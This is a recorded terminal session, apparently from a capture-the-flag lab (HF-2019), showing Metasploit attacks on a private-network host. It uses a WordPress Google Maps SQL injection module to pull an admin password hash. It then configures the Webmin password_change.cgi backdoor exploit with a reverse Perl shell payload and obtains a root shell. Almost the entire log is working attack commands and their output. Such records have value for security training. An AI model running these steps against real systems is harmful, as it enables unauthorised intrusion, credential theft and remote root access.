@@ -1,0 +1,635 @@
+Script started on 2020-09-25 00:36:40-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="33"]
+root@Pentest:/home/joaofracassi/hf-2019-linux# msfconsole
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\                                                  
+[0m[36m[0m                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 [31m##[0m        [31m###[0m        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com[0m
+[0m
+
+       =[ [33mmetasploit v5.0.101-dev[0m                         ]
++ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: When in a module, use [32mback[0m to go back to the top level prompt
+
+[?1034h[4mmsf5[0m [0m> [K[4mmsf5[0m [0m> [K[4mmsf5[0m [0m> [K[4mmsf5[0m [0m> f[K[4mmsf5[0m [0m> f[K[4mmsf5[0m [0m> fsea[K[K[K[Ksearch wp-google-maps
+[0m
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  auxiliary/admin/http/wp_google_maps_sqli  2019-04-02       normal  Yes    WordPress Google Maps Plugin SQL Injection
+
+
+[4mmsf5[0m [0m> wp-google-maps[K[K[K[K[K[K[K[K[K[K[K[K[K[Kuse auxiliary/admin/http/wp_google_maps_sqli
+[0m[4mmsf5[0m auxiliary([1m[31madmin/http/wp_google_maps_sqli[0m) [0m> show options
+[0m
+Module options (auxiliary/admin/http/wp_google_maps_sqli):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   DB_PREFIX  wp_              yes       WordPress table prefix
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   VHOST                       no        HTTP server virtual host
+
+[4mmsf5[0m auxiliary([1m[31madmin/http/wp_google_maps_sqli[0m) [0m> set rhosts 192.168.1.104[K6
+[0mrhosts => 192.168.1.106
+[4mmsf5[0m auxiliary([1m[31madmin/http/wp_google_maps_sqli[0m) [0m> run
+[0m[1m[34m[*][0m Running module against 192.168.1.106
+
+[1m[34m[*][0m 192.168.1.106:80 - Trying to retrieve the wp_users table...
+[1m[32m[+][0m Credentials saved in: /root/.msf4/loot/20200925004459_default_192.168.1.106_wp_google_maps.j_114506.bin
+[1m[32m[+][0m 192.168.1.106:80 - Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/http/wp_google_maps_sqli[0m) [0m> search [Ksploit webmin
+[0m[1m[34m[*][0m exec: searchsploit webmin
+
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+DansGuardian [01;31m[KWebmin[m[K Module 0.x - 'edit.cgi' Directory Traversal                                                                     | cgi/webapps/23535.txt
+phpMy[01;31m[KWebmin[m[K 1.0 - 'target' Remote File Inclusion                                                                                    | php/webapps/2462.txt
+phpMy[01;31m[KWebmin[m[K 1.0 - 'window.php' Remote File Inclusion                                                                                | php/webapps/2451.txt
+[01;31m[KWebmin[m[K - Brute Force / Command Execution                                                                                            | multiple/remote/705.pl
+[01;31m[Kwebmin[m[K 0.91 - Directory Traversal                                                                                                   | cgi/remote/21183.txt
+[01;31m[KWebmin[m[K 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                         | linux/remote/22275.pl
+[01;31m[KWebmin[m[K 0.x - 'RPC' Privilege Escalation                                                                                             | linux/remote/21765.pl
+[01;31m[KWebmin[m[K 0.x - Code Input Validation                                                                                                  | linux/local/21348.txt
+[01;31m[KWebmin[m[K 1.5 - Brute Force / Command Execution                                                                                        | multiple/remote/746.pl
+[01;31m[KWebmin[m[K 1.5 - Web Brute Force (CGI)                                                                                                  | multiple/remote/745.pl
+[01;31m[KWebmin[m[K 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                               | unix/remote/21851.rb
+[01;31m[KWebmin[m[K 1.850 - Multiple Vulnerabilities                                                                                             | cgi/webapps/42989.txt
+[01;31m[KWebmin[m[K 1.900 - Remote Command Execution (Metasploit)                                                                                | cgi/remote/46201.rb
+[01;31m[KWebmin[m[K 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                              | linux/remote/46984.rb
+[01;31m[KWebmin[m[K 1.920 - Remote Code Execution                                                                                                | linux/webapps/47293.sh
+[01;31m[KWebmin[m[K 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                   | linux/remote/47230.rb
+[01;31m[KWebmin[m[K 1.x - HTML Email Command Execution                                                                                           | cgi/webapps/24574.txt
+[01;31m[KWebmin[m[K < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                                 | multiple/remote/2017.pl
+[01;31m[KWebmin[m[K < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                                  | multiple/remote/1997.php
+[01;31m[KWebmin[m[K < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                       | linux/webapps/47330.rb
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+[4mmsf5[0m auxiliary([1m[31madmin/http/wp_google_maps_sqli[0m) [0m> search webmin
+[0m
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  auxiliary/admin/[45mwebmin[0m/edit_html_fileaccess  2012-09-06       normal     No     [45mWebmin[0m edit_html.cgi file Parameter Traversal Arbitrary File Access
+   1  auxiliary/admin/[45mwebmin[0m/file_disclosure       2006-06-30       normal     No     [45mWebmin[0m File Disclosure
+   2  exploit/linux/http/[45mwebmin[0m_backdoor           2019-08-10       [32mexcellent[0m  Yes    [45mWebmin[0m password_change.cgi Backdoor
+   3  exploit/linux/http/[45mwebmin[0m_packageup_rce      2019-05-16       [32mexcellent[0m  Yes    [45mWebmin[0m Package Updates Remote Command Execution
+   4  exploit/unix/webapp/[45mwebmin[0m_show_cgi_exec     2012-09-06       [32mexcellent[0m  Yes    [45mWebmin[0m /file/show.cgi Remote Command Execution
+   5  exploit/unix/webapp/[45mwebmin[0m_upload_exec       2019-01-17       [32mexcellent[0m  Yes    [45mWebmin[0m Upload Authenticated RCE
+
+
+Interact with a module by name or index, for example [32muse 5[0m or [32muse exploit/unix/webapp/webmin_upload_exec[0m
+
+[4mmsf5[0m auxiliary([1m[31madmin/http/wp_google_maps_sqli[0m) [0m> use exploit/linux/http/webmin_backdoor
+[0m[1m[34m[*][0m Using configured payload cmd/unix/reverse_perl
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> options
+[0m
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set rhosts 192.168.1.106
+[0mrhosts => 192.168.1.106
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set lpo[K[Khost 192.168.1.105
+[0mlhost => 192.168.1.105
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> options
+[0m
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.106    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set[K[K[Kshow o[Kopt[K[K[K[K[K[K[K[Kinfo
+[0m
+       Name: Webmin password_change.cgi Backdoor
+     Module: exploit/linux/http/webmin_backdoor
+   Platform: Unix, Linux
+       Arch: cmd, x86, x64
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2019-08-10
+
+Provided by:
+  AkkuS
+  wvu <wvu@metasploit.com>
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic (Unix In-Memory)
+  1   Automatic (Linux Dropper)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS     192.168.1.106    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+  RPORT      10000            yes       The target port (TCP)
+  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+  SRVPORT    8080             yes       The local port to listen on.
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+  TARGETURI  /                yes       Base path to Webmin
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  This module exploits a backdoor in Webmin versions 1.890 through 
+  1.920. Only the SourceForge downloads were backdoored, but they are 
+  listed as official downloads on the project's site. Unknown 
+  attacker(s) inserted Perl qx statements into the build server's 
+  source code on two separate occasions: once in April 2018, 
+  introducing the backdoor in the 1.890 release, and in July 2018, 
+  reintroducing the backdoor in releases 1.900 through 1.920. Only 
+  version 1.890 is exploitable in the default install. Later affected 
+  versions require the expired password changing feature to be 
+  enabled.
+
+References:
+  https://cvedetails.com/cve/CVE-2019-15107/
+  http://www.webmin.com/exploit.html
+  https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
+  https://blog.firosolutions.com/exploits/webmin/
+  https://github.com/webmin/webmin/issues/947
+
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set forceexploit true[K[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set forceexploit true[K[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set forceexploit true
+[0mforceexploit => true
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> opi[Ktion
+[0m[1m[31m[-][0m Unknown command: option.
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> options
+[0m
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.106    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set lport 443
+[0mlport => 443
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> optyion[K[K[K[Ktions
+[0m[1m[31m[-][0m Unknown command: opttions.
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> options
+[0m
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.106    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:443 
+[1m[34m[*][0m Configuring Automatic (Unix In-Memory) target
+[1m[34m[*][0m Sending cmd/unix/reverse_perl command payload
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:443 
+[1m[34m[*][0m Configuring Automatic (Unix In-Memory) target
+[1m[34m[*][0m Sending cmd/unix/reverse_perl command payload
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set ssl true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+ssl => true
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> options
+[0m
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.106    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:443 
+[1m[34m[*][0m Configuring Automatic (Unix In-Memory) target
+[1m[34m[*][0m Sending cmd/unix/reverse_perl command payload
+[1m[34m[*][0m Command shell session 1 opened (192.168.1.105:443 -> 192.168.1.106:44498) at 2020-09-25 00:57:02 -0300
+
+[0mid
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+cd /roo	
+cd /root
+ls
+JSON
+LICENCE
+LICENCE.ja
+README
+WebminCore.pm
+WebminUI
+acl
+acl_security.pl
+adsl-client
+ajaxterm
+apache
+at
+authentic-theme
+backup-config
+bacula-backup
+bandwidth
+bind8
+blue-theme
+burner
+change-user
+changepass.pl
+chooser.cgi
+cluster-copy
+cluster-cron
+cluster-passwd
+cluster-shell
+cluster-software
+cluster-useradmin
+cluster-usermin
+cluster-webmin
+config-aix
+config-cobalt-linux
+config-coherent-linux
+config-corel-linux
+config-debian-linux
+config-freebsd
+config-generic-linux
+config-gentoo-linux
+config-hpux
+config-irix
+config-lib.pl
+config-macos
+config-mandrake-linux
+config-msc-linux
+config-netbsd
+config-open-linux
+config-openbsd
+config-openmamba-linux
+config-openserver
+config-osf1
+config-pardus-linux
+config-redhat-linux
+config-slackware-linux
+config-sol-linux
+config-solaris
+config-suse-linux
+config-syno-linux
+config-trustix-linux
+config-turbo-linux
+config-united-linux
+config-unixware
+config-windows
+config.cgi
+config_save.cgi
+copyconfig.pl
+cpan
+create-module.pl
+cron
+custom
+date_chooser.cgi
+deb-name
+defaultacl
+defaulttheme
+dfsadmin
+dhcpd
+dovecot
+entities_map.txt
+exim
+exports
+fail2ban
+fastrpc.cgi
+favicon.ico
+fdisk
+feedback.cgi
+feedback_form.cgi
+fetchmail
+file
+filemin
+filter
+firewall
+firewall6
+firewalld
+fsdump
+gray-theme
+group_chooser.cgi
+grub
+heartbeat
+help.cgi
+htaccess-htpasswd
+idmapd
+images
+index.cgi
+inetd
+init
+inittab
+install-module.pl
+install-type
+ipfilter
+ipfw
+ipsec
+iscsi-client
+iscsi-server
+iscsi-target
+iscsi-tgtd
+jabber
+javascript-lib.pl
+krb5
+lang
+lang_list.txt
+ldap-client
+ldap-server
+ldap-useradmin
+logrotate
+lpadmin
+lvm
+mailboxes
+mailcap
+maketemp.pl
+man
+mime.types
+miniserv.pem
+miniserv.pl
+module_chooser.cgi
+mon
+mount
+mysql
+net
+newmods.pl
+nis
+openslp
+os_list.txt
+oschooser.pl
+package-updates
+pam
+pam_login.cgi
+pap
+passwd
+password_change.cgi
+password_form.cgi
+perlpath.pl
+phpini
+postfix
+postgresql
+ppp-client
+pptp-client
+pptp-server
+proc
+procmail
+proftpd
+qmailadmin
+quota
+raid
+record-login.pl
+record-logout.pl
+robots.txt
+rpc.cgi
+run-postinstalls.pl
+run-uninstalls.pl
+samba
+sarg
+sendmail
+servers
+session_login.cgi
+setup.bat
+setup.pl
+setup.sh
+shell
+shorewall
+shorewall6
+smart-status
+smf
+software
+spam
+squid
+sshd
+status
+stunnel
+switch_skill.cgi
+switch_user.cgi
+syslog
+syslog-ng
+system-status
+tcpwrappers
+telnet
+thirdparty.pl
+time
+tunnel
+ui-lib.pl
+unauthenticated
+update-from-repo.sh
+updown
+uptracker.cgi
+user_chooser.cgi
+useradmin
+usermin
+version
+vgetty
+web-lib-funcs.pl
+web-lib.pl
+webalizer
+webmin
+webmin-daemon
+webmin-pam
+webmin-search-lib.pl
+webmin_search.cgi
+webmincron
+webminlog
+wuftpd
+xinetd
+xmlrpc.cgi
+
+
+ie  exit
+^C
+Abort session 1? [y/N]  y
+
+[1m[34m[*][0m 192.168.1.106 - Command shell session 1 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> exit
+[0mroot@Pentest:/home/joaofracassi/hf-2019-linux# exit
+exit
+
+Script done on 2020-09-25 00:58:50-03:00 [COMMAND_EXIT_CODE="0"]
